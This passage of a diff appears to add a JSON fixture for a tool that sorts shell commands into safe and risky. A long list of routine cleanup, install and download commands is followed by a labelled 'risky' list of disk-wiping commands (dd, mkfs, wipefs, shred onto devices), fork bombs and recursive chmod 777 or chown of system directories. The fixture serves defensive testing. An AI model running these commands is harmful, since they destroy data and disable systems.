+  "rm -f build.log",
+  "rm -fr $HOME/.m2/repository/org/example",
+  "rm -fr ${HOME}/tmp/scratch",
+  "rm -fr ./out",
+  "rm -fr .cache node_modules",
+  "rm -fr .gradle .next",
+  "rm -fr .gradle build",
+  "rm -fr .next .turbo",
+  "rm -fr .parcel-cache .pytest_cache",
+  "rm -fr .parcel-cache target",
+  "rm -fr .pytest_cache coverage",
+  "rm -fr .pytest_cache site-packages",
+  "rm -fr .tox .tox",
+  "rm -fr .tox dist",
+  "rm -fr .tox site-packages",
+  "rm -fr .venv .turbo",
+  "rm -fr .venv coverage",
+  "rm -fr /mnt/data/cache",
+  "rm -fr /tmp/*",
+  "rm -fr /usr/share/doc/example",
+  "rm -fr /var/lib/apt/lists/*",
+  "rm -fr /var/tmp/zn",
+  "rm -fr __pycache__ tmp",
+  "rm -fr build .tox",
+  "rm -fr build dist",
+  "rm -fr build target",
+  "rm -fr dist coverage",
+  "rm -fr obj .gradle",
+  "rm -fr obj .next",
+  "rm -fr obj node_modules",
+  "rm -fr out .parcel-cache",
+  "rm -fr out site-packages",
+  "rm -fr out tmp",
+  "rm -fr site-packages __pycache__",
+  "rm -fr site-packages site-packages",
+  "rm -fr target dist",
+  "rm -fr vendor vendor",
+  "rm -fr ~/.cache/pip",
+  "rm -fr ~/.npm/_cacache",
+  "rm -fr ~/go/pkg/mod/cache",
+  "rm -i draft.md",
+  "rm -r \"$HOME/.local/share/Trash\"",
+  "rm -r ${HOME}/tmp/scratch",
+  "rm -r -fo node_modules",
+  "rm -r ../tmp",
+  "rm -r .cache out",
+  "rm -r .gradle .next",
+  "rm -r .gradle .parcel-cache",
+  "rm -r .next .cache",
+  "rm -r .next .parcel-cache",
+  "rm -r .parcel-cache target",
+  "rm -r .pytest_cache .gradle",
+  "rm -r .pytest_cache bin/Debug",
+  "rm -r .turbo .parcel-cache",
+  "rm -r .turbo __pycache__",
+  "rm -r .venv bin/Debug",
+  "rm -r .venv coverage",
+  "rm -r /home/alice/projects/app/build",
+  "rm -r /root/.cache/pip",
+  "rm -r /tmp/*",
+  "rm -r /var/cache/apk/*",
+  "rm -r __pycache__ build",
+  "rm -r __pycache__ site-packages",
+  "rm -r __pycache__ target",
+  "rm -r bin/Debug .parcel-cache",
+  "rm -r build site-packages",
+  "rm -r coverage build",
+  "rm -r dist tmp",
+  "rm -r node_modules .turbo",
+  "rm -r node_modules vendor",
+  "rm -r obj tmp",
+  "rm -r old_notes/",
+  "rm -r site-packages .parcel-cache",
+  "rm -r target target",
+  "rm -r tmp .pytest_cache",
+  "rm -r tmp __pycache__",
+  "rm -r tmp bin/Debug",
+  "rm -r tmp dist",
+  "rm -r tmp obj",
+  "rm -r ~/.gradle/caches",
+  "rm -r ~/Downloads/archive",
+  "rm -r ~/go/pkg/mod/cache",
+  "rm -r ~/projects/old-app",
+  "rm -rf \"$BUILD_DIR\"",
+  "rm -rf \"$HOME/Library/Application Support/Example\"",
+  "rm -rf \"${TMPDIR:-/tmp}/zn-test\"",
+  "rm -rf $HOME/.cache/yarn",
+  "rm -rf $HOME/.config/example-app",
+  "rm -rf $WORKDIR/out",
+  "rm -rf ../tmp",
+  "rm -rf ./dist ./build",
+  "rm -rf .cache node_modules",
+  "rm -rf .git/hooks/pre-commit.sample",
+  "rm -rf .next .gradle",
+  "rm -rf .parcel-cache .next",
+  "rm -rf .pytest_cache .venv",
+  "rm -rf .pytest_cache coverage",
+  "rm -rf .pytest_cache target",
+  "rm -rf .tox dist",
+  "rm -rf .turbo site-packages",
+  "rm -rf /Library/Developer/CommandLineTools",
+  "rm -rf /etc/apt/sources.list.d/example.list",
+  "rm -rf /home/$USER/.cache/pip",
+  "rm -rf /home/runner/work/_temp",
+  "rm -rf /home/runner/work/_temp/*",
+  "rm -rf /srv/www/old-site",
+  "rm -rf /tmp",
+  "rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.linux-amd64.tar.gz",
+  "rm -rf /usr/share/doc/example",
+  "rm -rf /var/lib/apt/lists/*",
+  "rm -rf /var/tmp/zn",
+  "rm -rf __pycache__ obj",
+  "rm -rf __pycache__ out",
+  "rm -rf bin/Debug .next",
+  "rm -rf bin/Debug __pycache__",
+  "rm -rf bin/Debug bin/Debug",
+  "rm -rf bin/Debug coverage",
+  "rm -rf bin/Debug tmp",
+  "rm -rf build bin/Debug",
+  "rm -rf build node_modules",
+  "rm -rf coverage .tox",
+  "rm -rf coverage target",
+  "rm -rf coverage vendor",
+  "rm -rf dist && npm run build",
+  "rm -rf dist .next",
+  "rm -rf dist .pytest_cache",
+  "rm -rf node_modules dist build target .venv",
+  "rm -rf node_modules package-lock.json && npm install",
+  "rm -rf node_modules vendor",
+  "rm -rf obj vendor",
+  "rm -rf out .turbo",
+  "rm -rf out vendor",
+  "rm -rf site-packages .cache",
+  "rm -rf site-packages .turbo",
+  "rm -rf site-packages bin/Debug",
+  "rm -rf target .pytest_cache",
+  "rm -rf tmp .next",
+  "rm -rf tmp out",
+  "rm -rf ~/.cache/pip",
+  "rm -rf ~/Library/Caches/com.example.app",
+  "rm -rv .cache .tox",
+  "rm -rv .cache __pycache__",
+  "rm -rv .cache node_modules",
+  "rm -rv .cache obj",
+  "rm -rv .gradle .parcel-cache",
+  "rm -rv .parcel-cache __pycache__",
+  "rm -rv .parcel-cache tmp",
+  "rm -rv .tox .tox",
+  "rm -rv __pycache__ .venv",
+  "rm -rv __pycache__ __pycache__",
+  "rm -rv __pycache__ obj",
+  "rm -rv __pycache__ tmp",
+  "rm -rv bin/Debug coverage",
+  "rm -rv build site-packages",
+  "rm -rv coverage .tox",
+  "rm -rv coverage node_modules",
+  "rm -rv dist vendor",
+  "rm -rv node_modules target",
+  "rm -rv obj build",
+  "rm -rv out coverage",
+  "rm -rv out site-packages",
+  "rm -rv out vendor",
+  "rm -rv site-packages out",
+  "rm -rv target target",
+  "rm -rv tmp .parcel-cache",
+  "rm -rv tmp tmp",
+  "rm -rv vendor bin/Debug",
+  "rm -rv vendor site-packages",
+  "rm file.txt",
+  "rmdir /s /q C:\\work\\app\\build",
+  "rmdir empty_dir",
+  "ruff check .",
+  "scp dist.tar.gz deploy@198.51.100.7:/srv/app/",
+  "sed -i 's/old/new/' ~/.zshrc",
+  "sed -i.bak \"s/foo/bar/g\" src/*.js",
+  "sed -n 1,20p scripts/cleanup.sh",
+  "sh -c \"cd build && make\"",
+  "shred -u secrets.txt",
+  "sleep 2 && echo done",
+  "smartctl -a /dev/nvme0n1",
+  "sort data.csv | uniq -c | sort -rn | head",
+  "source .venv/bin/activate",
+  "source <(kubectl completion bash)",
+  "source ~/.config/fish/config.fish",
+  "source ~/.zshrc",
+  "ssh deploy@203.0.113.5 \"systemctl restart app\"",
+  "stat -c %a file",
+  "sudo -u postgres psql -c \"select 1\"",
+  "sudo apt-get remove -y example-pkg",
+  "sudo apt-get update && sudo apt-get install -y build-essential",
+  "sudo bash -c \"echo 1 > /proc/sys/vm/drop_caches\"",
+  "sudo chown -R $(whoami) ~/.npm",
+  "sudo chown -R $USER /usr/local/lib/node_modules",
+  "sudo rm --recursive --force $HOME/.cache/yarn",
+  "sudo rm --recursive --force .gradle .turbo",
+  "sudo rm --recursive --force .pytest_cache .next",
+  "sudo rm --recursive --force .pytest_cache .turbo",
+  "sudo rm --recursive --force /opt/app/releases/20261001",
+  "sudo rm --recursive --force /srv/www/old-site",
+  "sudo rm --recursive --force /usr/local/lib/node_modules/example-pkg",
+  "sudo rm --recursive --force node_modules .cache",
+  "sudo rm --recursive --force node_modules coverage",
+  "sudo rm --recursive --force node_modules obj",
+  "sudo rm --recursive --force site-packages .cache",
+  "sudo rm --recursive --force site-packages node_modules",
+  "sudo rm --recursive --force tmp .pytest_cache",
+  "sudo rm --recursive --force ~/.npm/_cacache",
+  "sudo rm --recursive --force ~/Library/Caches/com.example.app",
+  "sudo rm -Rf .cache build",
+  "sudo rm -Rf .next .gradle",
+  "sudo rm -Rf .parcel-cache dist",
+  "sudo rm -Rf .pytest_cache dist",
+  "sudo rm -Rf bin/Debug .gradle",
+  "sudo rm -Rf build build",
+  "sudo rm -Rf build out",
+  "sudo rm -Rf coverage .gradle",
+  "sudo rm -Rf dist .next",
+  "sudo rm -Rf site-packages out",
+  "sudo rm -Rf target .pytest_cache",
+  "sudo rm -Rf target vendor",
+  "sudo rm -fr .cache tmp",
+  "sudo rm -fr .turbo .cache",
+  "sudo rm -fr /home/runner/work/_temp",
+  "sudo rm -fr bin/Debug coverage",
+  "sudo rm -fr dist __pycache__",
+  "sudo rm -fr target .pytest_cache",
+  "sudo rm -fr tmp .turbo",
+  "sudo rm -fr tmp bin/Debug",
+  "sudo rm -fr tmp target",
+  "sudo rm -fr vendor .turbo",
+  "sudo rm -fr ~/.gradle/caches",
+  "sudo rm -fr ~/Downloads/archive",
+  "sudo rm -r .pytest_cache .next",
+  "sudo rm -r /Users/bob/Library/Developer/Xcode/DerivedData",
+  "sudo rm -r /tmp/build-4821",
+  "sudo rm -r /usr/local/lib/node_modules/example-pkg",
+  "sudo rm -r build node_modules",
+  "sudo rm -r target .cache",
+  "sudo rm -r target .tox",
+  "sudo rm -r tmp .parcel-cache",
+  "sudo rm -r vendor .pytest_cache",
+  "sudo rm -r vendor target",
+  "sudo rm -rf $HOME/.m2/repository/org/example",
+  "sudo rm -rf .venv .next",
+  "sudo rm -rf /Users/bob/Library/Developer/Xcode/DerivedData",
+  "sudo rm -rf /opt/app/releases/20261001",
+  "sudo rm -rf /opt/example-app/old",
+  "sudo rm -rf /tmp/build-4821",
+  "sudo rm -rf /usr/lib/example",
+  "sudo rm -rf /var/lib/docker/overlay2/abc123",
+  "sudo rm -rf site-packages node_modules",
+  "sudo rm -rf target build",
+  "sudo rm -rf tmp __pycache__",
+  "sudo rm -rv .gradle .turbo",
+  "sudo rm -rv .parcel-cache .turbo",
+  "sudo rm -rv .turbo vendor",
+  "sudo rm -rv __pycache__ dist",
+  "sudo rm -rv __pycache__ out",
+  "sudo rm -rv build dist",
+  "sudo rm -rv build node_modules",
+  "sudo rm -rv coverage .pytest_cache",
+  "sudo rm -rv node_modules __pycache__",
+  "sudo rm -rv node_modules tmp",
+  "sudo rm -rv site-packages node_modules",
+  "sudo rm -rv target obj",
+  "sudo systemctl restart nginx",
+  "swift build",
+  "tail -5 ~/.profile",
+  "tail -f /var/log/syslog",
+  "tar czf backup.tgz ./src",
+  "tar czf ~/backup.tgz ~/projects",
+  "tar xzf release.tgz",
+  "terraform apply -auto-approve",
+  "terraform plan",
+  "test -d ~/projects || mkdir ~/projects",
+  "time npm test",
+  "time rm --recursive --force .next .venv",
+  "time rm --recursive --force .parcel-cache site-packages",
+  "time rm --recursive --force .venv out",
+  "time rm --recursive --force .venv site-packages",
+  "time rm --recursive --force __pycache__ dist",
+  "time rm --recursive --force __pycache__ node_modules",
+  "time rm --recursive --force site-packages obj",
+  "time rm --recursive --force tmp .gradle",
+  "time rm -Rf .pytest_cache build",
+  "time rm -Rf __pycache__ .cache",
+  "time rm -Rf node_modules .cache",
+  "time rm -Rf node_modules site-packages",
+  "time rm -Rf out coverage",
+  "time rm -Rf site-packages target",
+  "time rm -Rf vendor .venv",
+  "time rm -Rf vendor node_modules",
+  "time rm -fr .gradle dist",
+  "time rm -fr .next .pytest_cache",
+  "time rm -fr .next tmp",
+  "time rm -fr .tox .next",
+  "time rm -fr .turbo site-packages",
+  "time rm -fr .venv .gradle",
+  "time rm -fr build .pytest_cache",
+  "time rm -fr coverage build",
+  "time rm -fr site-packages .tox",
+  "time rm -fr target node_modules",
+  "time rm -fr tmp vendor",
+  "time rm -fr vendor obj",
+  "time rm -r .cache bin/Debug",
+  "time rm -r .cache node_modules",
+  "time rm -r .parcel-cache .parcel-cache",
+  "time rm -r .parcel-cache .tox",
+  "time rm -r .tox .parcel-cache",
+  "time rm -r bin/Debug dist",
+  "time rm -r node_modules out",
+  "time rm -r out __pycache__",
+  "time rm -r target vendor",
+  "time rm -r tmp .tox",
+  "time rm -rf .cache out",
+  "time rm -rf .pytest_cache .parcel-cache",
+  "time rm -rf bin/Debug build",
+  "time rm -rf build vendor",
+  "time rm -rf out .venv",
+  "time rm -rf out dist",
+  "time rm -rf out tmp",
+  "time rm -rf vendor coverage",
+  "time rm -rf vendor out",
+  "time rm -rv .tox .parcel-cache",
+  "time rm -rv .venv dist",
+  "time rm -rv site-packages .turbo",
+  "time rm -rv site-packages obj",
+  "timeout 30 npm test",
+  "touch .env.example",
+  "true || rm -rf node_modules",
+  "tsc -p tsconfig.json",
+  "type rm",
+  "umask 022",
+  "umount /mnt/usb",
+  "uname -a",
+  "uv pip install black",
+  "uv pip install fastapi",
+  "uv pip install numpy",
+  "uv pip install pytest",
+  "uv pip install requests",
+  "vim ~/.bash_profile",
+  "watch -n 5 df -h",
+  "wget --spider https://192.0.2.10/api/status",
+  "wget --spider https://198.51.100.7/api/status",
+  "wget --spider https://203.0.113.5:8080/api/status",
+  "wget --spider https://cdn.example.test/api/status",
+  "wget --spider https://dl.example.com/api/status",
+  "wget --spider https://example.com/api/status",
+  "wget --spider https://get.example.com/api/status",
+  "wget --spider https://install.example.test/api/status",
+  "wget --spider https://scripts.example.invalid/api/status",
+  "wget -nv https://198.51.100.7/get -O tool.zip",
+  "wget -nv https://198.51.100.7/install.sh -O tool.zip",
+  "wget -nv https://198.51.100.7/setup.sh -O tool.zip",
+  "wget -nv https://198.51.100.7/v2/install.sh -O tool.zip",
+  "wget -nv https://203.0.113.5:8080/install.sh -O release.tgz",
+  "wget -nv https://cdn.example.test/bootstrap -O data.json",
+  "wget -nv https://dl.example.com/run.sh -O data.json",
+  "wget -nv https://get.example.com/install -O data.json",
+  "wget -nv https://install.example.test/install -O install.sh",
+  "wget -nv https://scripts.example.invalid/install.sh -O release.tgz",
+  "wget -nv https://scripts.example.invalid/setup.sh -O archive.tar.gz",
+  "wget -q https://192.0.2.10/bootstrap -O install.sh",
+  "wget -q https://198.51.100.7/get -O install.sh",
+  "wget -q https://203.0.113.5:8080/install -O install.sh",
+  "wget -q https://203.0.113.5:8080/v2/install.sh -O install.sh",
+  "wget -q https://dl.example.com/setup.sh -O install.sh",
+  "wget -q https://example.com/install -O install.sh",
+  "wget -q https://example.com/run.sh -O data.json",
+  "wget -q https://install.example.test/v2/install.sh -O install.sh",
+  "wget -qO- https://192.0.2.10/pkg.tar.gz | tar -xz",
+  "wget -qO- https://198.51.100.7/pkg.tar.gz | tar -xz",
+  "wget -qO- https://203.0.113.5:8080/pkg.tar.gz | tar -xz",
+  "wget -qO- https://cdn.example.test/pkg.tar.gz | tar -xz",
+  "wget -qO- https://dl.example.com/pkg.tar.gz | tar -xz",
+  "wget -qO- https://example.com/data.json | jq .items",
+  "wget -qO- https://example.com/pkg.tar.gz | tar -xz",
+  "wget -qO- https://get.example.com/pkg.tar.gz | tar -xz",
+  "wget -qO- https://install.example.test/pkg.tar.gz | tar -xz",
+  "wget -qO- https://scripts.example.invalid/pkg.tar.gz | tar -xz",
+  "wget https://192.0.2.10/setup.sh -O archive.tar.gz",
+  "wget https://198.51.100.7/bootstrap -O data.json",
+  "wget https://198.51.100.7/install -O tool.zip",
+  "wget https://198.51.100.7/install.sh -O install.sh",
+  "wget https://203.0.113.5:8080/get -O archive.tar.gz",
+  "wget https://cdn.example.test/install -O install.sh",
+  "wget https://cdn.example.test/setup.sh -O data.json",
+  "wget https://dl.example.com/v2/install.sh -O data.json",
+  "wget https://example.com/file.zip && unzip file.zip",
+  "wget https://example.com/install -O archive.tar.gz",
+  "wget https://example.com/v2/install.sh -O release.tgz",
+  "wget https://scripts.example.invalid/bootstrap -O archive.tar.gz",
+  "which rm",
+  "whoami",
+  "xargs -a files.txt cat",
+  "yarn add @types/node",
+  "yarn add express",
+  "yarn add left-pad",
+  "yarn add react",
+  "yarn add typescript",
+  "yarn add zod",
+  "yarn install --frozen-lockfile"
+ ],
+ "risky": [
+  {
+   "cmd": "Clear-Disk -Number 1 -RemoveData -Confirm:$false",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "Format-Volume -DriveLetter D -Force",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "Format-Volume -DriveLetter E -FileSystem NTFS",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "blkdiscard /dev/nvme0n1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/disk2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/hda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/mapper/vg0-root",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/md0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/mmcblk0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/nvme0n1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/nvme1n1p2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/sda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/sdb1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/vda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "cat /dev/zero > /dev/xvda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/disk2 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/hda bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/mapper/vg0-root bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/md0 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/mmcblk0 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/nvme0n1 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/nvme1n1p2 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/sda bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/sdb1 bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/vda bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/urandom of=/dev/xvda bs=4M status=progress",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/mapper/vg0-root bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/mmcblk0 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/nvme1n1p2 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/sdb1 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "dd if=/dev/zero of=/dev/xvda bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/disk2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/hda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/mapper/vg0-root",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/md0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/mmcblk0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/nvme0n1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/nvme1n1p2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/sda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/sdb1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/vda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "echo x > /dev/xvda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkfs.xfs /dev/md0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkfs.xfs /dev/nvme0n1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkfs.xfs /dev/sda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkfs.xfs /dev/vda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkswap /dev/disk2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "mkswap /dev/hda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "shred -n1 -z /dev/sda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/disk2 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/hda bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/md0 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/sda bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=/dev/zero of=/dev/vda bs=1M",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/disk2 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/hda bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/mapper/vg0-root bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/md0 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/mmcblk0 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/nvme0n1 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/nvme1n1p2 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/sda bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/sdb1 bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/vda bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo dd if=image.iso of=/dev/xvda bs=4M conv=fsync",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo mkfs.ext4 /dev/xvda",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo mkfs.vfat /dev/mapper/vg0-root",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo mkfs.vfat /dev/mmcblk0",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo mkfs.vfat /dev/nvme1n1p2",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo mkfs.vfat /dev/sdb1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo shred -v /dev/sdb",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "sudo wipefs --all /dev/nvme0n1",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": "wipefs -a /dev/sdc",
+   "rule": "disk_overwrite"
+  },
+  {
+   "cmd": ": () { : | : & } ; :",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": ":(){ :|: & };:",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": ":(){ :|:& }; :",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": ":(){ :|:& };:",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": ":(){:|:&};:",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "bash -c 'bomb(){ bomb|bomb&};bomb'",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "bomb(){ bomb|bomb& };bomb",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "f(){ f|f& };f",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "forkbomb() { forkbomb | forkbomb & }; forkbomb",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "sh -c \":(){ :|:& };:\"",
+   "rule": "fork_bomb"
+  },
+  {
+   "cmd": "chgrp -R users /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chgrp -R users /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chgrp -R users /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod --recursive 777 /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod --recursive 777 /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod --recursive 777 /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 0777 /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 0777 /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 0777 /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 $HOME",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 /home/alice",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 ~",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R 777 ~/*",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx $HOME",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx /home/alice",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx ~",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -R a+rwx ~/*",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -Rf 777 /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -Rf 777 /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chmod -Rf 777 /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R $USER:$USER /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R $USER:$USER /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R $USER:$USER /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R 1000:1000 /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R 1000:1000 /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R 1000:1000 /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R nobody /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R nobody /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R nobody /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R root:root /",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R root:root /bin",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "chown -R root:root /usr",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chgrp -R users /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chgrp -R users /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chgrp -R users /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod --recursive 777 /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod --recursive 777 /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod --recursive 777 /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 0777 /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 0777 /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 0777 /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 $HOME",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 /etc",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 /home",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 /home/alice",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 /var",
+   "rule": "perm_root"
+  },
+  {
+   "cmd": "sudo chmod -R 777 ~",
+   "rule": "perm_root"
+  },
+  {
